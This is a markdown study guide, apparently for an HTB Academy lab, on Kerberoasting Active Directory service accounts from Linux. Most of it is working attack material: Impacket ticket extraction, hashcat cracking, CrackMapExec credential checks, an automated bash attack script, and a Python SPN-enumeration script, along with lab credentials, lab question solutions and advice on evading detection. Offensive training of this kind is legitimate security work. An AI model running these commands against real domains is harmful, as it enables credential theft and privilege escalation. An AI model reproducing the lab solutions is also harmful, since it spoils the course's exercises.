# Kerberoasting - from Linux

## 📋 Overview

Kerberoasting is a powerful lateral movement and privilege escalation technique that targets Service Principal Names (SPNs) in Active Directory environments. This attack exploits the fact that any domain user can request Kerberos tickets for service accounts, and these tickets are encrypted with the service account's NTLM hash, making them susceptible to offline password cracking attacks. Service accounts often have elevated privileges and weak passwords, making Kerberoasting one of the most effective AD attack techniques.

## 🎯 Attack Theory and Context

### 🔍 **What are Service Principal Names (SPNs)?**
- **SPNs** are unique identifiers that Kerberos uses to map service instances to service accounts
- **Service Accounts** run services to overcome network authentication limitations of built-in accounts
- **Domain Context** allows any domain user to request tickets for any SPN in the same domain
- **Cross-Forest** attacks are possible if authentication is permitted across trust boundaries

### 🎪 **Why Kerberoasting is Effective**
- **High Privileges**: Service accounts often have local admin or Domain Admin rights
- **Weak Passwords**: Services frequently use weak or default passwords for convenience
- **Multiple Systems**: Service accounts may have admin rights across multiple servers
- **Group Membership**: Often added to privileged groups like Domain Admins (directly or nested)
- **Business Critical**: Service accounts rarely have password expiration policies

### ⚡ **Attack Prerequisites**
- **Domain User Credentials**: Cleartext password, NTLM hash, or Kerberos ticket
- **Domain Context**: Shell in domain user context or SYSTEM level access
- **Domain Controller Access**: Ability to query DC for SPN information
- **Network Connectivity**: Access to domain network and DC (port 88, 389, 445)

---

## 🔧 Attack Scenarios and Methods

### 📊 **Common Attack Vectors**

| **Scenario** | **Requirements** | **Method** |
|--------------|------------------|------------|
| **Non-domain Linux** | Valid domain credentials | Impacket GetUserSPNs.py |
| **Domain-joined Linux** | Root access, keytab file | Kerberos authentication |
| **Domain-joined Windows** | Domain user authentication | PowerView, Rubeus, built-in tools |
| **SYSTEM on Windows** | Local SYSTEM privileges | Multiple tool options |
| **runas /netonly** | Non-domain Windows host | Credential impersonation |

### 🛠️ **Tool Options for Linux Attacks**
- **Impacket GetUserSPNs.py**: Primary Linux tool for SPN enumeration and ticket extraction
- **Kerberos Utils**: Native Linux Kerberos tools (kinit, klist, etc.)
- **Custom Scripts**: Python/Bash scripts leveraging LDAP and Kerberos libraries
- **CrackMapExec**: Integrated Kerberoasting functionality
- **Rubeus**: Windows tool that can be run through Wine

### ⚠️ **Attack Effectiveness Considerations**
- **Strong Passwords**: Modern environments may use complex service account passwords
- **Managed Service Accounts**: Group Managed Service Accounts (GMSA) resist this attack
- **Detection**: Security teams may monitor for unusual TGS ticket requests
- **Cracking Time**: TGS tickets take longer to crack than NTLM hashes

---

## 🔧 Impacket Installation and Setup

### 📦 **Installing Impacket Toolkit**
```bash
# Clone the official repository
git clone https://github.com/SecureAuthCorp/impacket.git

# Navigate to directory
cd impacket

# Install using pip (recommended)
sudo python3 -m pip install .

# Alternative: Install from package manager
sudo apt install python3-impacket

# Verify installation
GetUserSPNs.py -h
```

**Installation Output:**
```bash
$ sudo python3 -m pip install .

Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (1.1.2)
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.18.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (2.8.1)

Successfully installed impacket-0.9.25.dev1+20220208.122405.769c3196
```

### 🔍 **GetUserSPNs.py Help and Options**
```bash
# Display help menu
GetUserSPNs.py -h
```

**Key Command Options:**
```bash
GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-usersfile USERSFILE] 
               [-request] [-request-user username] [-save] [-outputfile OUTPUTFILE] 
               [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] 
               [-dc-ip ip address] target

# Important flags:
# -request              Request TGS tickets for all found SPNs
# -request-user USER    Request TGS ticket for specific user
# -outputfile FILE      Save tickets to file
# -dc-ip IP            Domain Controller IP address
# -hashes HASH         Use NTLM hash instead of password
# target               domain/username[:password]
```

---

## 🎯 Complete Kerberoasting Workflow

### 🔍 **Phase 1: SPN Discovery and Enumeration**
```bash
# Basic SPN enumeration (requires password prompt)
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Using credentials in command line
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2

# Using NTLM hash
GetUserSPNs.py -dc-ip 172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b INLANEFREIGHT.LOCAL/forend

# Target specific domain
GetUserSPNs.py -target-domain LOGISTICS.INLANEFREIGHT.LOCAL -dc-ip 172.16.5.240 INLANEFREIGHT.LOCAL/forend
```

**Example SPN Enumeration Output:**
```bash
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>
```

### 🎫 **Phase 2: TGS Ticket Extraction**

#### **Extract All TGS Tickets**
```bash
# Request all available TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Save all tickets to file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile all_tickets.txt
```

#### **Target Specific High-Value Accounts**
```bash
# Request ticket for specific user (Domain Admin)
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Save specific ticket to file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs.txt

# Request multiple specific users
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user BACKUPAGENT -outputfile backupagent_tgs.txt
```

**Example TGS Ticket Output:**
```bash
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>               

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2
```

### 🔐 **Phase 3: Offline Password Cracking**

#### **Hashcat Cracking Process**
```bash
# Hashcat mode 13100 for Kerberos 5 TGS-REP
hashcat -m 13100 sqldev_tgs.txt /usr/share/wordlists/rockyou.txt

# Advanced cracking with optimizations
hashcat -m 13100 sqldev_tgs.txt /usr/share/wordlists/rockyou.txt -O -w 3

# Use multiple wordlists
hashcat -m 13100 sqldev_tgs.txt /usr/share/wordlists/rockyou.txt /usr/share/wordlists/probable-v2-top12000.txt

# Resume cracking session
hashcat -m 13100 sqldev_tgs.txt /usr/share/wordlists/rockyou.txt --restore

# Show cracked passwords
hashcat -m 13100 sqldev_tgs.txt --show
```

**Example Successful Crack:**
```bash
$ hashcat -m 13100 sqldev_tgs.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f:database!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Speed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8765440/14344386 (61.11%)
Rejected.........: 0/8765440 (0.00%)
Restore.Point....: 8749056/14344386 (60.99%)
Candidates.#1....: davius07 -> darten170

Started: Tue Feb 15 17:44:49 2022
Stopped: Tue Feb 15 17:45:41 2022

# Cracked password: database!
```

### ✅ **Phase 4: Credential Validation**
```bash
# Test credentials with CrackMapExec
crackmapexec smb 172.16.5.5 -u sqldev -p 'database!'

# Test Domain Admin access
crackmapexec smb 172.16.5.5 -u sqldev -p 'database!' --sam

# Check access across multiple hosts
crackmapexec smb 172.16.5.0/24 -u sqldev -p 'database!' | grep '[+]'

# Test WinRM access
crackmapexec winrm 172.16.5.5 -u sqldev -p 'database!'

# Test MSSQL access (if SPN indicates SQL Server)
crackmapexec mssql 172.16.5.5 -u sqldev -p 'database!'
```

**Example Validation Output:**
```bash
$ crackmapexec smb 172.16.5.5 -u sqldev -p 'database!'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

---

## 🎯 HTB Academy Lab Solutions

### 📝 **Lab Questions & Solutions**

#### 🎫 **Question 1: "Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer."**

**Solution Process:**
```bash
# Step 1: Enumerate SPNs to find SAPService account
GetUserSPNs.py -dc-ip [DC_IP] INLANEFREIGHT.LOCAL/forend

# Step 2: Look for SAPService in the output
# Expected SPN: SAP/SAPService or similar

# Step 3: Request TGS ticket for SAPService specifically
GetUserSPNs.py -dc-ip [DC_IP] INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sapservice_tgs.txt

# Step 4: Crack the ticket with Hashcat
hashcat -m 13100 sapservice_tgs.txt /usr/share/wordlists/rockyou.txt

# Step 5: Show cracked password
hashcat -m 13100 sapservice_tgs.txt --show

# Alternative: Use common SAP default passwords
echo -e "pass\npassword\nsap123\nSAP123\nadmin\nchangeme\nPassword123" > sap_passwords.txt
hashcat -m 13100 sapservice_tgs.txt sap_passwords.txt
```

**Complete Lab Workflow:**
```bash
# Connect to HTB VPN and SSH to target
ssh htb-student@[TARGET_IP]
# Password: HTB_@cademy_stdnt!

# On the target system, use Impacket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2

# Look for SAPService in output, then request ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 -request-user SAPService

# Save ticket to file for cracking
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 -request-user SAPService -outputfile sapservice.txt

# Crack with Hashcat
hashcat -m 13100 sapservice.txt /usr/share/wordlists/rockyou.txt -O
```

**Expected Answer Format:** `[password]` (e.g., `Password123` or `!SAPPassword2022`)

#### 👥 **Question 2: "What powerful local group on the Domain Controller is the SAPService user a member of?"**

**Solution Process:**
```bash
# Method 1: Check group membership during SPN enumeration
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 | grep -i SAPService

# Method 2: Use CrackMapExec to enumerate groups after cracking password
crackmapexec ldap 172.16.5.5 -u SAPService -p '[CRACKED_PASSWORD]' --users

# Method 3: Use net command on Windows if you have access
# net user SAPService /domain

# Method 4: LDAP query for user details
ldapsearch -H ldap://172.16.5.5 -D "INLANEFREIGHT\forend" -w Klmcargo2 -b "DC=INLANEFREIGHT,DC=LOCAL" "(&(objectClass=user)(sAMAccountName=SAPService))" memberOf

# Method 5: PowerView if you have Windows access
# Get-DomainUser -Identity SAPService | Select-Object memberof
```

**Common Powerful Local Groups:**
- **Backup Operators**: Can backup and restore files (bypass NTFS permissions)
- **Server Operators**: Can manage domain controllers
- **Account Operators**: Can modify user accounts
- **Print Operators**: Can manage printers and print queues
- **Administrators**: Full administrative rights
- **Remote Desktop Users**: Can log in via RDP

**Expected Answer Format:** `[Group Name]` (e.g., `Backup Operators`)

---

## 🔧 Advanced Kerberoasting Techniques

### 🎯 **Targeted SPN Enumeration**
```bash
# Filter by service type
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend | grep -i "MSSQL\|HTTP\|SAP\|Oracle"

# Focus on Domain Admin accounts
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend | grep -i "Domain Admins"

# Look for privileged service patterns
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend | grep -E "(admin|svc|service|sql|backup|exchange)"

# Export to file for analysis
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend > spn_enumeration.txt
```

### 🔐 **Optimized Cracking Strategies**
```bash
# Use multiple wordlists in order of likelihood
hashcat -m 13100 tickets.txt /usr/share/wordlists/probable-v2-top12000.txt
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tickets.txt /usr/share/wordlists/kaonashi.txt

# Rule-based attacks
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attacks for known patterns
hashcat -m 13100 tickets.txt -a 3 ?u?l?l?l?l?l?d?d?d  # Password123 pattern
hashcat -m 13100 tickets.txt -a 3 ?l?l?l?d?d?d?d      # pass1234 pattern

# Combination attacks
hashcat -m 13100 tickets.txt -a 1 common_words.txt common_numbers.txt
```

### 🔍 **Cross-Domain Kerberoasting**
```bash
# Target child domains
GetUserSPNs.py -target-domain LOGISTICS.INLANEFREIGHT.LOCAL -dc-ip 172.16.5.240 INLANEFREIGHT.LOCAL/forend

# Target external forest trusts
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL -dc-ip 172.16.5.238 INLANEFREIGHT.LOCAL/forend

# Use different credentials for each domain
GetUserSPNs.py -target-domain CHILD.DOMAIN.COM -dc-ip [CHILD_DC] PARENT.DOMAIN.COM/user:password
```

### 🔄 **Automation and Scripting**
```bash
#!/bin/bash
# Automated Kerberoasting script

DOMAIN="INLANEFREIGHT.LOCAL"
DC_IP="172.16.5.5"
USERNAME="forend"
PASSWORD="Klmcargo2"
OUTPUT_DIR="./kerberoast_results"

# Create output directory
mkdir -p $OUTPUT_DIR

# Enumerate SPNs
echo "[+] Enumerating SPNs..."
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD > $OUTPUT_DIR/spn_enum.txt

# Extract usernames with SPNs
grep -v "Password\|Service\|---" $OUTPUT_DIR/spn_enum.txt | awk '{print $2}' > $OUTPUT_DIR/spn_users.txt

# Request tickets for all users
echo "[+] Requesting TGS tickets..."
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD -request -outputfile $OUTPUT_DIR/all_tickets.txt

# Start cracking
echo "[+] Starting Hashcat cracking..."
hashcat -m 13100 $OUTPUT_DIR/all_tickets.txt /usr/share/wordlists/rockyou.txt -O --potfile-path $OUTPUT_DIR/cracked.pot

# Show results
echo "[+] Cracked passwords:"
hashcat -m 13100 $OUTPUT_DIR/all_tickets.txt --show --potfile-path $OUTPUT_DIR/cracked.pot
```

---

## 🔍 Alternative Tools and Methods

### 🛠️ **Rubeus via Wine (Linux)**
```bash
# Install Wine
sudo apt install wine

# Download and setup Rubeus
wget https://github.com/GhostPack/Rubeus/releases/download/2.0.2/Rubeus.exe

# Use Rubeus for Kerberoasting
wine Rubeus.exe kerberoast /domain:INLANEFREIGHT.LOCAL /dc:172.16.5.5 /creduser:forend /credpassword:Klmcargo2

# Output tickets for Hashcat
wine Rubeus.exe kerberoast /domain:INLANEFREIGHT.LOCAL /format:hashcat /outfile:tickets.txt
```

### 🔧 **CrackMapExec Integration**
```bash
# Kerberoasting with CrackMapExec
crackmapexec ldap 172.16.5.5 -u forend -p Klmcargo2 --kerberoasting kerberoast_output.txt

# Automatic cracking
crackmapexec ldap 172.16.5.5 -u forend -p Klmcargo2 --kerberoasting kerberoast_output.txt --crack-hashcat /usr/share/wordlists/rockyou.txt
```

### 🐍 **Custom Python Scripts**
```python
#!/usr/bin/env python3
# Custom Kerberoasting script using ldap3 and impacket

from ldap3 import Server, Connection, ALL, NTLM
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
import sys

def get_spns(dc_ip, domain, username, password):
    """Enumerate SPNs via LDAP"""
    server = Server(dc_ip, get_info=ALL)
    conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
    
    search_base = f"DC={',DC='.join(domain.split('.'))}"
    search_filter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))"
    
    conn.search(search_base, search_filter, attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf'])
    
    spns = []
    for entry in conn.entries:
        spns.append({
            'username': str(entry.sAMAccountName),
            'spn': [str(spn) for spn in entry.servicePrincipalName],
            'groups': [str(group) for group in entry.memberOf] if entry.memberOf else []
        })
    
    return spns

# Usage
if __name__ == "__main__":
    spns = get_spns("172.16.5.5", "INLANEFREIGHT.LOCAL", "forend", "Klmcargo2")
    for spn_info in spns:
        print(f"User: {spn_info['username']}")
        print(f"SPNs: {spn_info['spn']}")
        print(f"Groups: {spn_info['groups']}")
        print("-" * 50)
```

---

## ⚡ Quick Reference Commands

### 🔧 **Essential Kerberoasting Workflow**
```bash
# 1. Basic enumeration
GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN]/[USER]:[PASS]

# 2. Request all tickets
GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN]/[USER]:[PASS] -request -outputfile all_tickets.txt

# 3. Request specific ticket
GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN]/[USER]:[PASS] -request-user [TARGET_USER] -outputfile target_ticket.txt

# 4. Crack tickets
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt

# 5. Validate credentials
crackmapexec smb [DC_IP] -u [CRACKED_USER] -p '[CRACKED_PASS]'
```

### 📊 **Common SPN Patterns**
| **Service** | **SPN Format** | **Common Ports** |
|-------------|----------------|------------------|
| **MSSQL** | `MSSQLSvc/server.domain.com:1433` | 1433, 1434 |
| **HTTP** | `HTTP/server.domain.com` | 80, 443, 8080 |
| **LDAP** | `ldap/server.domain.com` | 389, 636, 3268 |
| **CIFS/SMB** | `cifs/server.domain.com` | 445, 139 |
| **WinRM** | `WSMAN/server.domain.com` | 5985, 5986 |
| **Exchange** | `exchangeMDB/server.domain.com` | 135, 993, 995 |
| **Terminal Services** | `TERMSRV/server.domain.com` | 3389 |

---

## 🔑 Key Takeaways

### ✅ **Attack Success Factors**
- **Weak Passwords**: Service accounts with dictionary or predictable passwords
- **High Privileges**: Accounts with Domain Admin or local admin rights
- **Multiple SPNs**: Users with several service registrations increase attack surface
- **Legacy Systems**: Older environments often have weaker service account security

### 🎯 **Target Prioritization**
1. **Domain Admins**: Highest priority - immediate domain compromise
2. **Service Admins**: Accounts with admin rights on multiple systems
3. **Database Services**: Often have elevated privileges (MSSQL, Oracle, SAP)
4. **Exchange Services**: May have high privileges in Exchange environments
5. **Backup Services**: Often have backup operator rights

### ⚠️ **Detection and Evasion**
- **Unusual TGS Requests**: Large numbers of ticket requests may trigger alerts
- **Service Account Monitoring**: Some orgs monitor service account authentication
- **Behavioral Analysis**: Rapid successive ticket requests are suspicious
- **Time-based Attacks**: Spread requests over time to avoid detection
- **Legitimate SPNs**: Focus on real service accounts rather than user accounts with SPNs

### 🚀 **Post-Exploitation Opportunities**
- **SQL Server Access**: Use cracked MSSQL service accounts for `xp_cmdshell`
- **Service Impersonation**: Create service tickets for the compromised SPN
- **Privilege Escalation**: Use high-privilege service accounts for lateral movement
- **Persistence**: Service accounts often don't change passwords frequently

---

*Kerberoasting remains one of the most effective Active Directory attack techniques - by targeting the intersection of service requirements and administrative convenience, it often provides a direct path to high-privilege access in enterprise environments.* 